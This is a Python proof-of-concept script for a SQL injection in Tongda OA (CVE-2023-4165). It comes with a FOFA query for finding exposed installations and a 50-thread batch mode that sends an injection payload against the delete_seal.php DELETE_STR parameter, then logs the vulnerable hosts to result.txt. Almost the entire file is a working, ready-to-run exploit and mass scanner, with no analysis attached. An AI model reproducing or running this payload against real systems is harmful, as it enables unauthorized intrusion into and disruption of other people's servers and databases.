# 通达OA_sql注入漏洞POC(CVE-2023-4165)
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

# fofa语句
# app=“TDXK-通达OA” && icon_hash=“-759108386”

def banner():
    test = """
████████╗██████╗  ██████╗  █████╗       ███████╗ ██████╗ ██╗     
╚══██╔══╝██╔══██╗██╔═══██╗██╔══██╗      ██╔════╝██╔═══██╗██║     
   ██║   ██║  ██║██║   ██║███████║█████╗███████╗██║   ██║██║     
   ██║   ██║  ██║██║   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
   ██║   ██████╔╝╚██████╔╝██║  ██║      ███████║╚██████╔╝███████╗
   ╚═╝   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                 
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='通达OA_sql注入漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zhHK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        response = requests.get(url=target+api_payload,verify=False,headers=headers,timeout=10)
        if response.status_code == 200 and '/static/js/ba/' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")



if __name__ == '__main__':
    main()
